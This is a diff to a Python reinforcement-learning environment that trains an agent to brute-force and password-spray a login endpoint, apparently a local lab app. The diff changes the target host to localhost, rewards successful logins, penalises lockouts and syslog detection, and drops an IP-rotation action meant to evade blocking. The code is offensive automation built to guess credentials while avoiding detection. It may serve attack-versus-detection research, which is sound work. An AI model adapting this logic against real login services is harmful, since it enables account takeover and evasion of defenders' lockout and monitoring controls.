@@ -20,7 +20,7 @@ class CustomEnv:
         self.current_user = next(self.users)
         self.current_password = next(self.passwords)
         self.http_query = HTTPQuery(
-            host="http://app1.com",
+            host="http://127.0.0.1:8082", #host="http://app1.com",
             default_headers={"Content-Type": "application/x-www-form-urlencoded"},
             post_query="username=${USER}&password=${PASS}",
             path="/login",
@@ -38,54 +38,43 @@ class CustomEnv:
         # Define actions
         if action == 0:
             # Thread wait x seconds
-            wait_time = 1  # Define wait time in seconds
-            time.sleep(wait_time)
+            time.sleep(1)
         elif action == 1:
             # Skip user
             self.current_user = next(self.users)
         elif action == 2:
             # Try next password
             self.current_password = next(self.passwords)
-            query_result = self.http_query.perform_query(
+            success, status_code, response_text = self.http_query.perform_query_verbose(
                 username=self.current_user,
                 password=self.current_password,
                 search_string="Welcome"
             )
             self.query_count += 1
-            if query_result:
+
+            # Reward based on HTTP status code and success
+            if success:
                 reward += 10
+            elif status_code == 403:
+                reward -= 5  # Negative reward for lockout
+                time.sleep(5)  # Introduce delay for lockout
             else:
-                # Call perform_query on SyslogServer.py and check if it returns False
-                syslog_result = read_write_sharedMem()
-                if not syslog_result:
-                    reward += 1
-            if self.query_count % 50 == 0:
-                reward += 5
+                reward += 1  # Small reward for unsuccessful attempt
+
         elif action == 3:
             # Stop the process for x seconds
-            stop_time = 5  # Define stop time in seconds
-            time.sleep(stop_time)
+            time.sleep(5)
         elif action == 4:
-            # Change between planBruteForce and passwordSpray
+            # Toggle between brute force and spray
             self.plan = "passwordSpray" if self.plan == "bruteForce" else "bruteForce"
-        elif action == 5:
-            # Change IP address from a pool of IPs. This will just work on Windows machines
-            ip_pool = cycle(['192.168.0.1', '192.168.0.2', '192.168.0.3', '192.168.0.4'])
-            new_ip = next(ip_pool)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.bind((new_ip, 0))
-            s.connect(('10.0.0.122', 80))
-        else:            
-            pass
 
-        # Call read_write_sharedMem and adjust reward if needed
+        # Other reward adjustments
         syslog_output = read_write_sharedMem()
         if syslog_output:
             reward -= 10
 
-        # Return the default state, reward, and done flag
-        done = False  # Adjust if the environment has a terminal condition
-        reward = randomReward
+        # Return state, reward, and done flag
+        done = False  # Adjust if needed
         return self.state, reward, done
 
     def reset(self):
@@ -156,18 +145,20 @@ if __name__ == "__main__":
     state_size = 10  # Adjusted to match the default state size in CustomEnv
     action_size = 5
     agent = Agent(state_size, action_size)
-    episodes = 1000
-    batch_size = 32
+    episodes = 500
+    batch_size = 16
+    
+    print("all done")
 
-    for e in range(episodes):
+    for e in range(episodes):  # Start with fewer episodes, like 100, then increase gradually
         state = env.reset()
-        for time in range(500):
+        for step in range(10):  # Limit steps per episode for faster prototyping
             action = agent.act(state)
             next_state, reward, done = env.step(action)
             agent.remember(state, action, reward, next_state, done)
             state = next_state
             if done:
-                print(f"episode: {e}/{episodes}, score: {time}, e: {agent.epsilon:.2}")
+                print(f"episode: {e}/{episodes}, step: {step}, e: {agent.epsilon:.2}")
                 break
             if len(agent.memory) > batch_size:
                 agent.replay(batch_size)
